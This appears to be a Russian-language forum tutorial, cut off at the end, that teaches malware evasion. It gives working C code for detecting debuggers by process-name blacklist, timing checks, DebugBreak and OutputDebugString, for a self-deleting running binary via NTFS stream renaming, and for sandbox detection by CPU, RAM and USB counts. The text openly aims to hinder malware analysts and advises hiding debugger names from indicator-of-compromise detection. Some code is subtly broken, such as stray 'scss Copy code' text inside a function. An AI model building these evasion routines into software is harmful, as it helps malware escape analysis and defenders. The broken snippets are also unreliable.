Другой способ обнаружения процессов в режиме отладки заключается в проверке имен текущих выполняющихся процессов по списку известных имен отладчиков. Этот &quot;черный список&quot; имен хранится в жестко закодированном массиве. Если происходит совпадение между именем процесса и списком запретных имен, то на системе работает приложение отладчика.<br />
<br />
Перечисление процессов, выполняющихся на компьютере, можно осуществить с использованием любого из рассмотренных ранее методов. В данном случае будет использован метод перечисления процессов CreateToolhelp32Snapshot.<br />
<br />
Массив черного списка представлен следующим образом:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define BLACKLISTARRAY_SIZE 5 // Количество элементов в массиве

WCHAR* g_BlackListedDebuggers[BLACKLISTARRAY_SIZE] = {
        L&quot;x64dbg.exe&quot;,                 // Отладчик xdbg
        L&quot;ida.exe&quot;,                    // Дизассемблер IDA
        L&quot;ida64.exe&quot;,                  // Дизассемблер IDA
        L&quot;VsDebugConsole.exe&quot;,         // Отладчик Visual Studio
        L&quot;msvsmon.exe&quot;                 // Отладчик Visual Studio
};</code></pre>
	</div>
</div><br />
Массив черного списка должен содержать как можно больше имен отладчиков, чтобы обнаружить широкий спектр отладчиков. Кроме того, строки должны быть обфусцированы с использованием хеширования строк, так как имена отладчиков в бинарном файле могут быть использованы как индикаторы компрометации.<br />
<br />
Функция BlackListedProcessesCheck использует массив процессов g_BlackListedDebuggers в качестве массива запретных процессов. Она возвращает TRUE в случае совпадения имени процесса с элементом g_BlackListedDebuggers.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL BlackListedProcessesCheck() {

    HANDLE                hSnapShot        = NULL;
    PROCESSENTRY32W        ProcEntry        = { .dwSize = sizeof(PROCESSENTRY32W) };
    BOOL                bSTATE            = FALSE;


    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf(&quot;\t[!] CreateToolhelp32Snapshot не удалось : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    if (!Process32FirstW(hSnapShot, &amp;ProcEntry)) {
        printf(&quot;\t[!] Process32FirstW не удалось : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        // Перебирает массив &#039;g_BlackListedDebuggers&#039; и сравнивает каждый элемент с текущим именем процесса, полученным из снимка
        for (int i = 0; i &lt; BLACKLISTARRAY_SIZE; i++){
            if (wcscmp(ProcEntry.szExeFile, g_BlackListedDebuggers[i]) == 0) {
                // Обнаружен отладчик
                wprintf(L&quot;\t[i] Найден \&quot;%s\&quot; с PID : %d \n&quot;, ProcEntry.szExeFile, ProcEntry.th32ProcessID);
                bSTATE = TRUE;
                break;
            }
        }

    } while (Process32Next(hSnapShot, &amp;ProcEntry));


_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>Обнаружение точек останова с использованием GetTickCount64</b><br />
<br />
Точки останова используются для приостановки выполнения программы в определенной точке, что позволяет провести анализ памяти, состояния регистров, переменных и многого другого.<br />
<br />
Приостановку выполнения можно обнаружить с использованием WinAPI GetTickCount64. Эта функция получает количество миллисекунд, прошедших с момента запуска системы. Анализ времени, затраченного процессором между двумя вызовами GetTickCount64, может указать, выполняется ли отладка вредоносного программного обеспечения. Если время превышает ожидаемое, то можно предположить, что вредоносное программное обеспечение отлаживается.<br />
<br />
Обнаружение задержек точки останова можно обнаружить, вычислив среднее значение T1 - T0 и сохраняя его как жестко закодированное значение. Если разница между T1 и T0 превышает это значение, то задержка, скорее всего, вызвана точкой останова. Например, если разница между T1 - T0 на хост-машине составляет 20 секунд, но на выполнение требуется больше времени, то существует сильная вероятность, что задержка между этими двумя точками вызвана точкой останова. Исходное значение следует немного увеличить, чтобы учесть медленные процессоры.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787167799.png"
		data-src="https://osint42.org/attachments/1746787167799-png.245/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787167799-png.245/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787167799.png"
			title="1746787167799.png"
			width="1342" height="572" loading="lazy" />
	</div><br />
<br />
<b>Код антидебаггинга с использованием GetTickCount64</b><br />
<br />
Функция TimeTickCheck определяет, выполняется ли отладка вредоносного программного обеспечения, путем анализа разницы между двумя вызовами GetTickCount64. Если разница больше заданного порога, то считается, что происходит отладка.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>DWORD64 TimeTickCheck() {

    DWORD64 T0 = 0;
    DWORD64 T1 = 0;

    // Запомнить начальное время
    T0 = GetTickCount64();

    // Выполнить некоторые действия, которые могут быть остановлены точкой останова

    // Получить время после выполнения действий
    T1 = GetTickCount64();

    // Вычислить разницу
    DWORD64 TimeDiff = T1 - T0;

    return TimeDiff;
}</code></pre>
	</div>
</div><br />
<b>Обнаружение точек останова с использованием QueryPerformanceCounter </b><br />
<br />
Функция QueryPerformanceCounter WinAPI аналогична ранее рассмотренной функции GetTickCount64 WinAPI. Разница заключается в том, что QueryPerformanceCounter использует высокоразрешающий счетчик производительности, предоставляемый аппаратным обеспечением, который может измерять время с точностью до наносекунд, в то время как GetTickCount64 использует счетчик времени, увеличивающийся каждую миллисекунду. Обратите внимание, что функция QueryPerformanceCounter извлекает значение счетчика производительности в единицах счета, а не в миллисекундах.<br />
<br />
Функция TimeTickCheck2 использует функцию QueryPerformanceCounter WinAPI для обнаружения точек останова. Она возвращает TRUE, если разница между Time2.QuadPart и Time1.QuadPart превышает среднее значение выполнения кода между этими моментами, которое составляет 100000 единиц счета.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL TimeTickCheck2() {

    LARGE_INTEGER    Time1    = { 0 },
                    Time2    = { 0 };

    if (!QueryPerformanceCounter(&amp;Time1)) {
        printf(&quot;\t[!] QueryPerformanceCounter [1] Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

/*
    ДРУГОЙ КОД
*/

    if (!QueryPerformanceCounter(&amp;Time2)) {
        printf(&quot;\t[!] QueryPerformanceCounter [2] Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;\t[i] (Time2.QuadPart - Time1.QuadPart) : %d \n&quot;, (Time2.QuadPart - Time1.QuadPart));

    if ((Time2.QuadPart - Time1.QuadPart) &gt; 100000){
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Обнаружение отладчика с использованием DebugBreak</b><br />
<br />
Функция DebugBreak вызывает исключение точки останова, EXCEPTION_BREAKPOINT, в текущем процессе. Это исключение должно быть обработано отладчиком, если он подключен к текущему процессу. Техника заключается в вызове исключения и проверке того, попытается ли отладчик его обработать.<br />
<br />
Для обработки исключения из вызова DebugBreak используется блок кода с использованием __try и __except, и функция GetExceptionCode используется для извлечения кода исключения. В этом случае существует два возможных сценария:<br />
<ol>
<li data-xf-list-type="ol">Если извлеченное исключение равно EXCEPTION_BREAKPOINT, то выполняется EXCEPTION_EXECUTE_HANDLER, что означает, что исключение не было обработано отладчиком.</li>
<li data-xf-list-type="ol">Если исключение не равно EXCEPTION_BREAKPOINT, что означает, что отладчик обработал возникшее исключение (и не наш блок try-except), то выполняется EXCEPTION_CONTINUE_SEARCH, что заставляет отладчик обрабатывать возникшее исключение.</li>
</ol>Функция DebugBreakCheck возвращает FALSE, если функция DebugBreak WinAPI успешно выполнилась и исключение не было перехвачено/обработано отладчиком, а вместо этого обработано нашим блоком try-except, что указывает на то, что к текущему процессу не подключен отладчик.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL DebugBreakCheck() {

    __try {
        DebugBreak();
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        // если исключение равно EXCEPTION_BREAKPOINT, то выполняется EXCEPTION_EXECUTE_HANDLER, и функция возвращает FALSE
        return FALSE;
    }

    // если исключение не равно EXCEPTION_BREAKPOINT, то выполняется EXCEPTION_CONTINUE_SEARCH, и функция возвращает TRUE
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Обнаружение отладчика с использованием OutputDebugString</b><br />
<br />
Еще одним WinAPI, который можно использовать для обнаружения отладчиков, является OutputDebugString. Эта функция используется для отправки строки в отладчик для отображения. Если отладчик существует, то OutputDebugString успешно выполняет свою задачу.<br />
<br />
Можно выполнить OutputDebugString и проверить, не произошла ли ошибка, используя GetLastError. Если произошла ошибка, то GetLastError вернет ненулевой код ошибки. Ненулевое значение кода ошибки в данном случае эквивалентно отсутствию отладчика. Если GetLastError возвращает ноль, это означает, что OutputDebugString успешно отправил строку отладчику.<br />
<br />
Функция OutputDebugStringCheck использует вышеуказанную логику и возвращает TRUE, если функция OutputDebugStringW выполнена успешно. Кроме того, она использует SetLastError для установки значения последней ошибки в 1. Это делается просто для того, чтобы убедиться, что это ненулевое значение перед вызовом OutputDebugString, чтобы уменьшить количество ложных срабатываний.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL OutputDebugStringCheck() {

    SetLastError(1);
    OutputDebugStringW(L&quot;Ru-sfera is debug&quot;);

    // если GetLastError равно 0, то OutputDebugStringW выполнен успешно
    if (GetLastError() == 0) {
        return TRUE;
    }

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Обнаружение отладчика с использованием проверки ошибок </b><br />
<br />
Проверка ошибок - это метод антидебаггинга, который пытается найти следы работы отладчика в коде программы. Когда отладчик остановит выполнение программы на точке останова или приостановит ее для анализа, он будет внедрять свой код и использовать свои собственные средства для управления выполнением. Это может привести к появлению дополнительных ошибок в программе, которые обычно не возникают в нормальном режиме выполнения.<br />
<br />
Обнаружение таких ошибок может помочь выявить наличие отладчика. Примеры ошибок, которые можно проверить, включают:<br />
<ol>
<li data-xf-list-type="ol">Division by zero (деление на ноль).</li>
<li data-xf-list-type="ol">Null pointer dereference (разыменование нулевого указателя).</li>
<li data-xf-list-type="ol">Access violation (нарушение доступа к памяти).</li>
<li data-xf-list-type="ol">Invalid instruction (недопустимая инструкция).</li>
</ol>Искусственное создание и обнаружение таких ошибок может быть частью стратегии анти-дебаггинга в вредоносном программном обеспечении.<br />
<br />
Важно отметить, что этот метод не всегда надежен, так как ошибки могут возникать и в нормальных условиях выполнения программы. Поэтому он должен использоваться в сочетании с другими методами антидебаггинга для более надежной защиты.<br />
<br />
<b>Самоудаление вируса.)</b><br />
<br />
Выше обсуждались несколько техник, которые могут помешать исследователям и аналитикам вредоносных программ изучать вредоносное программное обеспечение и предотвращать понимание его функциональности или создание сигнатур. Теперь предлагаю рассмотреть продвинутую технику анти-отладки, которая работает путем автоматического удаления самого вредоносного программного обеспечения.<br />
<br />
<b>Файловая система NTFS</b><br />
<br />
Прежде чем погрузиться в самоудаление, важно понять, как работает файловая система New Technology File System (NTFS). NTFS - это собственная файловая система, реализованная в качестве основной файловой системы для операционной системы Windows. Она превосходит своих предшественников, FAT и exFAT, предлагая такие функции, как разрешения на файлы и папки, сжатие, шифрование, жесткие ссылки, символические ссылки и транзакционные операции. NTFS также обеспечивает увеличенную надежность, производительность и масштабируемость.<br />
<br />
Файловая система NTFS также поддерживает альтернативные потоки данных. Файлы в файловых системах NTFS могут иметь несколько потоков данных, кроме потока данных по умолчанию, :$DATA. :$DATA существует для каждого файла, предоставляя альтернативный способ доступа к ним.<br />
<br />
<b>Удаление выполняющегося двоичного файла</b><br />
<br />
На Windows невозможно удалить текущий выполняющийся двоичный файл, так как для удаления файла обычно требуется, чтобы ни один другой процесс не использовал его. На изображении ниже показана неудачная попытка удаления папки &quot;Release&quot; при наличии открытого файла внутри этой папки.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787181933.png"
		data-src="https://osint42.org/attachments/1746787181933-png.246/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787181933-png.246/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787181933.png"
			title="1746787181933.png"
			width="1843" height="549" loading="lazy" />
	</div><br />
<br />
Еще одним примером является использование функции DeleteFile WinAPI, которая удаляет существующий файл. Функция DeleteFile WinAPI завершается с ошибкой ERROR_ACCESS_DENIED.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787188029.png"
		data-src="https://osint42.org/attachments/1746787188029-png.247/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787188029-png.247/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787188029.png"
			title="1746787188029.png"
			width="1674" height="712" loading="lazy" />
	</div><br />
<br />
Один из способов обойти это - переименовать поток данных по умолчанию :$DATA в другое случайное имя, которое представляет собой новый поток данных. После этого удаление только что переименованного потока данных приведет к стиранию двоичного файла с диска, даже если он все еще выполняется.<br />
<br />
<b>Получение дескриптора файла</b><br />
<br />
Первым шагом процесса является получение дескриптора целевого файла, который представляет собой файл локальной реализации. Дескриптор файла можно получить с помощью функции CreateFile WinAPI. Флаг доступа должен быть установлен в DELETE, чтобы предоставить разрешения на удаление файла.<br />
<br />
<b>Переименование потока данных</b><br />
<br />
Следующим шагом для удаления выполняющегося двоичного файла является переименование потока данных :$DATA. Это можно сделать с помощью функции SetFileInformationByHandle WinAPI с флагом FileRenameInfo.<br />
<br />
Функция SetFileInformationByHandle WinAPI показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL SetFileInformationByHandle(
[in] HANDLE hFile, // Дескриптор файла, для которого изменяется информация.
[in] FILE_INFO_BY_HANDLE_CLASS FileInformationClass, // Значение флага, указывающее тип информации, которую нужно изменить
[in] LPVOID lpFileInformation, // Указатель на буфер, содержащий информацию для изменения
[in] DWORD dwBufferSize // Размер буфера &#039;lpFileInformation&#039; в байтах
);</code></pre>
	</div>
</div><br />
Параметр FileInformationClass должен быть значением перечисления FILE_INFO_BY_HANDLE_CLASS.<br />
<br />
Когда параметр FileInformationClass установлен в FileRenameInfo, то lpFileInformation должен быть указателем на структуру FILE_RENAME_INFO, как показано в следующем изображении<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787217471.png"
		data-src="https://osint42.org/attachments/1746787217471-png.248/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787217471-png.248/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787217471.png"
			title="1746787217471.png"
			width="849" height="96" loading="lazy" />
	</div><br />
<br />
Структура FILE_RENAME_INFO показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _FILE_RENAME_INFO {
union {
BOOLEAN ReplaceIfExists;
DWORD Flags;
} DUMMYUNIONNAME;
BOOLEAN ReplaceIfExists;
HANDLE RootDirectory;
DWORD FileNameLength; // Размер &#039;FileName&#039; в байтах
WCHAR FileName[1]; // Новое имя
} FILE_RENAME_INFO, *PFILE_RENAME_INFO;</code></pre>
	</div>
</div><br />
Два члена, которые необходимо установить, - это FileNameLength и FileName. Документация Microsoft объясняет, как определить новое имя потока данных NTFS.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787226401.png"
		data-src="https://osint42.org/attachments/1746787226401-png.249/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787226401-png.249/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787226401.png"
			title="1746787226401.png"
			width="1214" height="195" loading="lazy" />
	</div><br />
<br />
Следовательно, FileName должен быть строкой широких символов, начинающейся с двоеточия <img src="../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f642.png" class="smilie smilie--emoji" loading="lazy" width="64" height="64" alt="(:" title="Smile    (:"  data-smilie="1"data-shortname="(:" />).<br />
<br />
<b>Удаление потока данных</b><br />
<br />
Последним шагом является удаление потока данных :$DATA для стирания файла с диска. Для этого будет использоваться та же функция SetFileInformationByHandle WinAPI, но с другим флагом, FileDispositionInfo. Этот флаг помечает файл для удаления при закрытии его дескриптора. Это флаг, который использует Microsoft <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle#examples" target="_blank" class="link link--external" rel="noopener">в приведенном ниже примере.</a><br />
<br />
Когда используется флаг FileDispositionInfo, lpFileInformation должен быть указателем на структуру FILE_DISPOSITION_INFO, как показано в следующем изображении<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787236100.png"
		data-src="https://osint42.org/attachments/1746787236100-png.250/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787236100-png.250/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787236100.png"
			title="1746787236100.png"
			width="799" height="91" loading="lazy" />
	</div><br />
<br />
Структура FILE_DISPOSITION_INFO показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _FILE_DISPOSITION_INFO {
BOOLEAN DeleteFile; // Установите в &#039;TRUE&#039;, чтобы пометить файл для удаления
} FILE_DISPOSITION_INFO, *PFILE_DISPOSITION_INFO;</code></pre>
	</div>
</div><br />
Член DeleteFile должен просто быть установлен в TRUE для удаления файла.<br />
<br />
<b>Обновление потока данных файла</b><br />
<br />
После вызова функции SetFileInformationByHandle в первый раз для переименования потока данных файла NTFS, дескриптор файла должен быть закрыт и затем снова открыт с помощью другого вызова функции CreateFile. Это делается для обновления потока данных файла, чтобы новый дескриптор содержал новый поток данных.<br />
<br />
<b>Заключительный код самоудаления</b><br />
<br />
Функция DeleteSelf, показанная ниже, использует описанный процесс для удаления файла с диска во время его выполнения.<br />
<br />
Весь код в следующем фрагменте был ранее объяснен, за исключением функции GetModuleFileNameW WinAPI. Эта функция используется для получения пути к файлу, содержащему указанный модуль. Если первый параметр установлен в NULL (как в приведенном ниже коде), то она получает путь к исполняемому файлу текущего процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Новое имя потока данных
#define NEW_STREAM L&quot;:RuSfera&quot;

BOOL DeleteSelf() {

scss
Copy code
WCHAR                       szPath [MAX_PATH * 2] = { 0 };
FILE_DISPOSITION_INFO       Delete                = { 0 };
HANDLE                      hFile                 = INVALID_HANDLE_VALUE;
PFILE_RENAME_INFO           pRename               = NULL;
const wchar_t*              NewStream             = (const wchar_t*)NEW_STREAM;
SIZE_T                      sRename               = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);


// Выделение достаточного буфера для структуры &#039;FILE_RENAME_INFO&#039;
pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
if (!pRename) {
    printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

// Очистка некоторых структур
ZeroMemory(szPath, sizeof(szPath));
ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));

//----------------------------------------------------------------------------------------
// Пометка файла для удаления (используется во 2-м вызове SetFileInformationByHandle)
Delete.DeleteFile = TRUE;

// Установка буфера нового имени потока данных и его размера в структуре &#039;FILE_RENAME_INFO&#039;
pRename-&gt;FileNameLength = sizeof(NewStream);
RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));

//----------------------------------------------------------------------------------------

// Используется для получения текущего имени файла
if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
    printf(&quot;[!] GetModuleFileNameW Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

//----------------------------------------------------------------------------------------
// ПЕРЕИМЕНОВАНИЕ

// Открытие дескриптора текущего файла
hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
if (hFile == INVALID_HANDLE_VALUE) {
    printf(&quot;[!] CreateFileW [R] Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

wprintf(L&quot;[i] Renaming :$DATA to %s  ...&quot;, NEW_STREAM);

// Переименование потока данных
if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
    printf(&quot;[!] SetFileInformationByHandle [R] Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}
wprintf(L&quot;[+] DONE \n&quot;);

CloseHandle(hFile);

//----------------------------------------------------------------------------------------
// УДАЛЕНИЕ

// Открытие нового дескриптора текущего файла
hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
if (hFile == INVALID_HANDLE_VALUE) {
    printf(&quot;[!] CreateFileW [D] Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

wprintf(L&quot;[i] DELETING ...&quot;);

// Пометка для удаления после закрытия дескриптора файла
if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &amp;Delete, sizeof(Delete))) {
    printf(&quot;[!] SetFileInformationByHandle [D] Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}
wprintf(L&quot;[+] DONE \n&quot;);

CloseHandle(hFile);

//----------------------------------------------------------------------------------------

// Освобождение выделенного буфера
HeapFree(GetProcessHeap(), 0, pRename);

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Демонстрация </b><br />
<br />
На изображении ниже показан процесс SelfDeletion.exe, работающий, хотя двоичный файл был стерт с диска.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787251150.png"
		data-src="https://osint42.org/attachments/1746787251150-png.251/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787251150-png.251/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787251150.png"
			title="1746787251150.png"
			width="1749" height="746" loading="lazy" />
	</div></div>
						

							<h2>Обход виртуальных машин</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746787426897.png"
		data-src="https://osint42.org/attachments/1746787426897-png.252/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787426897-png.252/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787426897.png"
			title="1746787426897.png"
			width="579" height="438" loading="lazy" />
	</div><br />
<br />
В этой статье давайте рассмотрим техники антивиртуализации, в случае если вирус пытаются запустить в виртуальной среде или песочнице.<br />
<br />
<b>Антивиртуализация через характеристики аппаратного обеспечения</b><br />
<br />
В общем случае виртуализированные среды не имеют полного доступа к аппаратному обеспечению хост-машины. Отсутствие полного доступа к аппаратуре может быть использовано вредоносным программным обеспечением для определения, выполняется ли оно внутри виртуальной среды или песочницы. Учитывайте, что не существует гарантии полной точности, потому что машина может просто выполняться с низкими характеристиками аппаратного обеспечения. Проверяемые характеристики аппаратного обеспечения следующие:<br />
<ol>
<li data-xf-list-type="ol">Центральный процессор (CPU) - проверка наличия менее чем 2 процессоров.</li>
<li data-xf-list-type="ol">Оперативная память (RAM) - проверка наличия менее чем 2 гигабайтов.</li>
<li data-xf-list-type="ol">Количество ранее подключенных устройств USB - проверка наличия менее чем 2 USB-устройств.</li>
</ol><b>Проверка ЦПУ </b><br />
<br />
Проверка ЦПУ может быть выполнена с использованием функции GetSystemInfo WinAPI. Эта функция возвращает структуру SYSTEM_INFO, содержащую информацию о системе, включая количество процессоров.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>SYSTEM_INFO SysInfo = { 0 };

GetSystemInfo(&amp;SysInfo);
if (SysInfo.dwNumberOfProcessors &lt; 2) {
    // возможно, виртуализированное окружение
}</code></pre>
	</div>
</div><br />
<b>Проверка оперативной памяти (RAM)</b><br />
<br />
Проверку доступной оперативной памяти можно выполнить с помощью функции GlobalMemoryStatusEx WinAPI. Эта функция возвращает структуру MEMORYSTATUSEX, содержащую информацию о текущем состоянии физической и виртуальной памяти в системе. Объем оперативной памяти можно найти через член ullTotalPhys. Он содержит количество текущей физической памяти в байтах.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>MEMORYSTATUSEX MemStatus = { .dwLength = sizeof(MEMORYSTATUSEX) };

if (!GlobalMemoryStatusEx(&amp;MemStatus)) {
    printf(&quot;\n\t[!] GlobalMemoryStatusEx завершился с ошибкой: %d \n&quot;, GetLastError());
}

if ((DWORD)MemStatus.ullTotalPhys &lt;= (DWORD)(2 * 1073741824)) {
    // возможно, виртуализированное окружение
}</code></pre>
	</div>
</div><br />
Обратите внимание, что 2 * 1073741824 - это размер двух гигабайтов в байтах.<br />
<br />
<b>Проверка числа ранее подключенных USB-устройств</b><br />
<br />
Наконец, количество ранее подключенных USB-устройств в системе можно проверить через реестр HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Enum\USBSTOR. Значение реестра можно получить с помощью функций RegOpenKeyExA и RegQueryInfoKeyA WinAPI.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HKEY hKey = NULL;
DWORD dwUsbNumber = NULL;
DWORD dwRegErr = NULL;

if ((dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE, &quot;SYSTEM\\ControlSet001\\Enum\\USBSTOR&quot;, NULL, KEY_READ, &amp;hKey)) != ERROR_SUCCESS) {
    printf(&quot;\n\t[!] RegOpenKeyExA завершился с ошибкой: %d | 0x%0.8X \n&quot;, dwRegErr, dwRegErr);
}

if ((dwRegErr = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &amp;dwUsbNumber, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) != ERROR_SUCCESS) {
    printf(&quot;\n\t[!] RegQueryInfoKeyA завершился с ошибкой: %d | 0x%0.8X \n&quot;, dwRegErr, dwRegErr);
}

// Менее 2 ранее подключенных USB-устройств
if (dwUsbNumber &lt; 2) {
    // возможно, виртуализированное окружение
}</code></pre>
	</div>
</div><br />
<b>Антивиртуализация через характеристики аппаратного обеспечения (код)</b><br />
<br />
Предыдущие фрагменты кода объединяются в одну функцию IsVenvByHardwareCheck. Эта функция возвращает TRUE, если она обнаруживает виртуализированное окружение.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
